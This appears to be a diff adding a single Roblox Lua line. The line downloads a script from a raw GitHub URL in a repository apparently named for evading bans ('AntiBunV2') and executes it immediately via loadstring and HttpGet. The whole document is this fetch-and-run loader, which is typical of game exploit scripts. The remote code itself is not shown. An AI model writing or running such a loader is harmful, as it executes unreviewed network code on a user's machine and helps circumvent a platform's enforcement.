@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ivanko1202/AntiBunV2/main/2.lua"))()
